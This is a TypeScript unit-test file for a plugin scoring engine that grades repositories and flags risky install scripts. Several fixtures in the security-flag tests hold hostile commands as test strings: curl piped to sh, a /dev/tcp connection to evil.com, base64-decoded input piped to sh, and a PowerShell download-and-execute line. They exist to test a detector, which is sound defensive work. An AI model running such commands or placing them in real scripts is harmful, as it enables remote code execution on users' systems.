// Scoring engine unit tests
// Run: npx tsx --test tests/scoring.test.ts

import { test } from "node:test";
import assert from "node:assert/strict";
import {
  scorePlugin,
  assignGrade,
  detectSecurityFlags,
  WEIGHTS,
  MAX_SCORES,
  type GithubRepoInput,
  type NpmInput,
} from "../src/lib/scoring";

function baseRepo(overrides: Partial<GithubRepoInput> = {}): GithubRepoInput {
  return {
    name: "owner/repo",
    owner: "owner",
    repoName: "repo",
    githubUrl: "https://github.com/owner/repo",
    description: "A test plugin",
    stars: 100,
    pushedAt: new Date().toISOString(),
    archived: false,
    readmeLength: 2000,
    hasLicense: true,
    hasCi: true,
    openIssues: 5,
    hasDshBundle: true,
    installScriptText: "",
    ...overrides,
  };
}

function baseNpm(overrides: Partial<NpmInput> = {}): NpmInput {
  return {
    name: "repo",
    version: "1.0.0",
    lastPublishAt: new Date().toISOString(),
    weeklyDownloads: 5000,
    hasInstallScripts: false,
    exists: true,
    ...overrides,
  };
}

test("healthy repo scores high grade A", () => {
  const result = scorePlugin({ repo: baseRepo(), npm: baseNpm() });
  assert.ok(result.score >= 80, `expected score >= 80, got ${result.score}`);
  assert.equal(result.grade, "A");
  assert.equal(result.flags.length, 0);
});

test("weights match spec: 30/25/30/15", () => {
  assert.equal(WEIGHTS.maintenance, 0.3);
  assert.equal(WEIGHTS.docs, 0.25);
  assert.equal(WEIGHTS.npm, 0.3);
  assert.equal(WEIGHTS.ecosystem, 0.15);
});

test("dimension maxima match spec", () => {
  assert.equal(MAX_SCORES.maintenance, 30);
  assert.equal(MAX_SCORES.docs, 25);
  assert.equal(MAX_SCORES.npm, 30);
  assert.equal(MAX_SCORES.ecosystem, 15);
});

test("stale repo (no push > 1yr) loses maintenance points", () => {
  const staleDate = new Date(Date.now() - 400 * 24 * 3600 * 1000).toISOString();
  const result = scorePlugin({
    repo: baseRepo({ pushedAt: staleDate }),
    npm: baseNpm(),
  });
  assert.ok(
    result.dimensions.maintenance < MAX_SCORES.maintenance,
    "maintenance should be below max for stale repo"
  );
  assert.ok(
    result.details.maintenance.some((d) => d.includes("over 1 year")),
    "should record stale push detail"
  );
});

test("missing README penalizes docs", () => {
  const result = scorePlugin({
    repo: baseRepo({ readmeLength: 10 }),
    npm: baseNpm(),
  });
  assert.ok(result.dimensions.docs < MAX_SCORES.docs);
  assert.ok(result.details.docs.some((d) => d.includes("README")));
});

test("no npm package gives baseline npm score", () => {
  const result = scorePlugin({
    repo: baseRepo(),
    npm: { name: "nope", version: null, lastPublishAt: null, weeklyDownloads: 0, hasInstallScripts: false, exists: false },
  });
  assert.equal(result.dimensions.npm, 10);
});

test("danger install script detected (curl|sh)", () => {
  const repo = baseRepo({ installScriptText: "curl -fsSL https://x.io/install.sh | sh" });
  const flags = detectSecurityFlags(repo);
  const danger = flags.find((f) => f.type === "danger");
  assert.ok(danger, "expected danger flag");
  assert.ok(danger?.label.includes("危险安装脚本"));
});

test("danger install script detected (/dev/tcp)", () => {
  const repo = baseRepo({ installScriptText: "exec 3<>/dev/tcp/evil.com/443" });
  const flags = detectSecurityFlags(repo);
  assert.ok(flags.some((f) => f.type === "danger"));
});

test("danger install script detected (base64 -d)", () => {
  const repo = baseRepo({ installScriptText: "echo 'aGVsbG8=' | base64 -d | sh" });
  const flags = detectSecurityFlags(repo);
  assert.ok(flags.some((f) => f.type === "danger"));
});

test("danger install script detected (iex)", () => {
  const repo = baseRepo({ installScriptText: "iex (New-Object Net.WebClient).DownloadString('https://x')" });
  const flags = detectSecurityFlags(repo);
  assert.ok(flags.some((f) => f.type === "danger"));
});

test("missing dsh.bundle yields warning", () => {
  const repo = baseRepo({ hasDshBundle: false });
  const flags = detectSecurityFlags(repo);
  assert.ok(flags.some((f) => f.type === "warning" && f.label.includes("dsh.bundle")));
});

test("archived repo yields info flag", () => {
  const repo = baseRepo({ archived: true });
  const flags = detectSecurityFlags(repo);
  assert.ok(flags.some((f) => f.type === "info" && f.label.includes("归档")));
});

test("danger flag forces grade to D even with high score", () => {
  const repo = baseRepo({
    stars: 5000,
    readmeLength: 5000,
    hasDshBundle: true,
    installScriptText: "curl -sSL https://evil/x | sh",
  });
  const result = scorePlugin({ repo, npm: baseNpm({ weeklyDownloads: 50000 }) });
  assert.equal(result.grade, "D");
  assert.ok(result.flags.some((f) => f.type === "danger"));
});

test("assignGrade thresholds", () => {
  assert.equal(assignGrade(85, false), "A");
  assert.equal(assignGrade(80, false), "A");
  assert.equal(assignGrade(79, false), "B");
  assert.equal(assignGrade(60, false), "B");
  assert.equal(assignGrade(59, false), "C");
  assert.equal(assignGrade(40, false), "C");
  assert.equal(assignGrade(39, false), "D");
  assert.equal(assignGrade(95, true), "D"); // danger always caps at D
});

test("score is clamped to 0-100", () => {
  const result = scorePlugin({
    repo: baseRepo({ stars: 999999, readmeLength: 99999 }),
    npm: baseNpm({ weeklyDownloads: 99999999 }),
  });
  assert.ok(result.score <= 100);
  assert.ok(result.score >= 0);
});
